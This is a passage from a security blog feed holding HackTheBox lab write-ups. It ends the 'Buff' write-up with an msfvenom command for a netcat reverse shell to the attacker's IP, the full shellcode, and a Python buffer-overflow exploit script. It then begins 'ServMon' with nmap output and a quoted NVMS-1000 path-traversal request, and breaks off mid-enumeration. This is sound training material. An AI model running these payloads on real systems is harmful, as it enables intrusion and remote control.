</span></span></code></pre></div><p>To generate a new payload/shell code, I&rsquo;ll be using <code>msfvenom</code>. But, instead of running <code>calc.exe</code>, I&rsquo;ll change it to execute the netcat I&rsquo;ve uploaded before (during upgrading shell).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.18 9005&#39;</span> -b <span class="s1">&#39;\x00\x0A\x0D&#39;</span> -f python -v payload
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">+=</span> b<span class="s2">&#34;\xa4\x95\xf5\x68\xf4\xe0\x05&#34;</span>
</span></span></code></pre></div><p>After removed the comments and changed the payload, the <code>bofexploit.py</code> now look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">padding1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">1052</span>
</span></span><span class="line"><span class="cl"><span class="n">EIP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xB5\x42\xA8\x68</span><span class="s2">&#34;</span> <span class="c1"># 0x68A842B5 -&gt; PUSH ESP, RET</span>
</span></span><span class="line"><span class="cl"><span class="n">NOPS</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">30</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbe\xd0\xe7\xa9\x73\xd9\xc7\xd9\x74\x24\xf4\x5f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc9\xb1\x3e\x31\x77\x12\x03\x77\x12\x83\x17</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe3\x4b\x86\x6b\x04\x09\x69\x93\xd5\x6e\xe3\x76</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe4\xae\x97\xf3\x57\x1f\xd3\x51\x54\xd4\xb1\x41</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\x98\x1d\x66\x58\x16\x78\x49\x59\x0b\xb8\xc8</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd9\x56\xed\x2a\xe3\x98\xe0\x2b\x24\xc4\x09\x79</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xfd\x82\xbc\x6d\x8a\xdf\x7c\x06\xc0\xce\x04\xfb</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x91\xf1\x25\xaa\xaa\xab\xe5\x4d\x7e\xc0\xaf\x55</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x63\xed\x66\xee\x57\x99\x78\x26\xa6\x62\xd6\x07</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x06\x91\x26\x40\xa1\x4a\x5d\xb8\xd1\xf7\x66\x7f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xab\x23\xe2\x9b\x0b\xa7\x54\x47\xad\x64\x02\x0c</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa1\xc1\x40\x4a\xa6\xd4\x85\xe1\xd2\x5d\x28\x25</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x53\x25\x0f\xe1\x3f\xfd\x2e\xb0\xe5\x50\x4e\xa2</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x0c\xea\xa9\x68\x59\x87\xf0\xe6\x9c\x15\x8f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x45\x9e\x25\x8f\xf9\xf7\x14\x04\x96\x80\xa8\xcf</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xd2\x7f\xe3\x4d\x72\xe8\xaa\x04\xc6\x75\x4d\xf3</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x05\x80\xce\xf1\xf5\x77\xce\x70\xf3\x3c\x48\x69</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89\x2d\x3d\x8d\x3e\x4d\x14\xce\xfa\xed\xe2\xa3</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x9f\x7f\x7e\x1f\x13\xe8\xe1\xea\xbd\xb4\x85\x7b</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x35\x2b\x2a\xec\xd8\xd7\xc1\xae\x74\x7b\x08\x2b</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf1\x1e\x74\x9e\x64\xc1\x17\x8d\x02\x2f\xbd\x35</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">overrun</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1500</span> <span class="err">—</span> <span class="nb">len</span><span class="p">(</span><span class="n">padding1</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="n">padding1</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">NOPS</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">overrun</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span><span class="mi">8888</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"> <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"> <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_value</span><span class="p">)</span>
</span></span></code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «buff» «10.10.14.18»
</span></span><span class="line"><span class="cl">$ python2 bofexploit.py
</span></span></code></pre></div><p>On my listener:</p>
<img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" />
<p>Now I can grab the root flag or dump the hashes.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - ServMon</title>
      <link>https://fahmifj.github.io/hackthebox/servmon/</link>
      <pubDate>Fri, 19 Jun 2020 21:12:21 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/servmon/</guid>
      <description>Exploiting embedded system software</description>
      <content:encoded><![CDATA[<p>ServMon starts with FTP anonymous access that allows me to read the users&rsquo; notes. One of these notes contains a hint to a location of a password list in one of the user&rsquo;s dekstops. This machine hosts a NVMS-1000 which is vulnerable to path traversal attack and is exploited to obtain the password list. With a password spray attack, I&rsquo;m able to gain a foothold on the system . Inside the machine, there is a config file of NSClient++, in which it contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\System.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Directory/Path Traversal</li>
<li>NVMS-1000 exploitation</li>
<li>NSClient-0.5.2.35 exploitation</li>
<li>Port Forwarding/Tunneling</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
<li>Burp Suite</li>
<li><a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">NSClient-0.5.2.35 Exploit PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «servmon» «10.10.14.23»
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/initial-servmon <span class="s1">&#39;10.10.10.184&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">21/tcp   open  ftp           Microsoft ftpd
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_01-18-20  12:05PM       &lt;DIR&gt;          Users
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: Windows_NT
</span></span><span class="line"><span class="cl">22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions, RTSPRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-type: text/html
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">340</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>     AuthInfo: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html PUBLIC <span class="s2">&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;&lt;/title&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;script <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span>&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     window.location.href <span class="o">=</span> <span class="s2">&#34;Pages/login.htm&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/script&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/head&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;body&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/body&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/html&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">408</span> Request Timeout
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-type: text/html
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    AuthInfo:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
</span></span><span class="line"><span class="cl">5666/tcp open  tcpwrapped
</span></span><span class="line"><span class="cl">6699/tcp open  napster?
</span></span><span class="line"><span class="cl">8443/tcp open  ssl/https-alt
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">18</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Document not found
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">302</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>     Location: /index.html
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    refox/68.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: NSClient++
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was /index.html
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2020-01-14T13:24:20
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2021-01-13T13:24:20
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl"><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span></span><span class="line"><span class="cl">SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>4/12%Time<span class="o">=</span>5E93410A%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NULL
</span></span><span class="line"><span class="cl">SF:,6B,<span class="s2">&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,1B4,<span class="s2">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
</span></span></span><span class="line"><span class="cl"><span class="s2">....
</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: -28s
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   2.02: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2020-04-12T16:27:15
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
</span></span></span></code></pre></div><p>RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box. Besides these standard ports, there are some interesting services installed on the box:</p>
<ul>
<li>FTP with anonymous login on port 21,</li>
<li>SSH service on port 22</li>
<li>HTTPS service on non-standard port 8443.</li>
</ul>
<p>This machine probably is not an Active Directory.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">21/tcp   open  ftp           Microsoft ftpd
</span></span><span class="line"><span class="cl">| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span></span><span class="line"><span class="cl">|_01-18-20  12:05PM       &lt;DIR&gt;          Users
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Based on <code>nmap</code> scans, the FTP root directory contains the <code>Users</code> folder. Inside the <code>Users</code> folder, I found two subfolders, one is <code>Nathan</code> and the other is <code>Nadine</code>. Both of these users&rsquo; folders contain a text file, I copied these files to my machine.</p>
<p>The first file is <code>Confidential.txt</code>. It contains a note from <code>Nadine</code> to <code>Nathan</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Nathan,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Regards
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nadine
</span></span></code></pre></div><p>The second file is <code>Notes to do.txt</code>. It contains a to do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1) Change the password for NVMS - Complete
</span></span><span class="line"><span class="cl">2) Lock down the NSClient Access - Complete
</span></span><span class="line"><span class="cl">3) Upload the passwords
</span></span><span class="line"><span class="cl">4) Remove public access to NVMS
</span></span><span class="line"><span class="cl">5) Place the secret files in SharePoint
</span></span></code></pre></div><p>I&rsquo;ll note that there&rsquo;s a <code>Password.txt</code> text on <code>Nathan</code>&rsquo;s desktop and the uncompleted to do.</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is not allowed, so nothing to see here.</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 redirects me to a login page on <code>Pages/login.htm</code></p>
<p><div class="img-container"><img src="imgs/image-20210406234719034.png" alt="image-20210406234719034"  /></div>
</p>
<p>Based on Google, NVSMS-1000 is a software for CCTV monitoring. I don&rsquo;t find the default credentials, and it doesn&rsquo;t seem to work with common credentials.</p>
<h4 id="exploit-db">Exploit-DB</h4>
<p>A quick search on <code>exploit-db</code> shows it is vulnerable to Directory Traversal.</p>
<blockquote>
<p>PoC: <a href="https://www.exploit-db.com/exploits/47774">https://www.exploit-db.com/exploits/47774</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># Title: NVMS-1000 - Directory Traversal
</span></span><span class="line"><span class="cl"># Date: 2019-12-12
</span></span><span class="line"><span class="cl"># Author: Numan Türle
</span></span><span class="line"><span class="cl"># Vendor Homepage: http://en.tvt.net.cn/
</span></span><span class="line"><span class="cl"># Version : N/A
</span></span><span class="line"><span class="cl"># Software Link : http://en.tvt.net.cn/products/188.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">POC
</span></span><span class="line"><span class="cl">---------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 12.0.0.1
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Response
</span></span><span class="line"><span class="cl">---------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">; for 16-bit app support
</span></span><span class="line"><span class="cl">[fonts]
</span></span><span class="line"><span class="cl">[extensions]
</span></span><span class="line"><span class="cl">[mci extensions]
</span></span><span class="line"><span class="cl">[files]
</span></span><span class="line"><span class="cl">[Mail]
</span></span><span class="line"><span class="cl">MAPI=1
</span></span></code></pre></div><p>There&rsquo;s no version is specified, but I&rsquo;ll give it a try.</p>
<h3 id="tcp-8443---nsclient">TCP 8443 - NSClient++</h3>
<h4 id="exploit-db-1">Exploit-DB</h4>
<p><div class="img-container"><img src="imgs/image-20210407052822638.png" alt="image-20210407052822638"  /></div>
</p>
<p>It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding &rsquo;exploit&rsquo; to the keyword pops up an exploit link that refers to exploit-DB:</p>
<ul>
<li>Manual PoC: <a href="https://www.exploit-db.com/exploits/46802">https://www.exploit-db.com/exploits/46802</a></li>
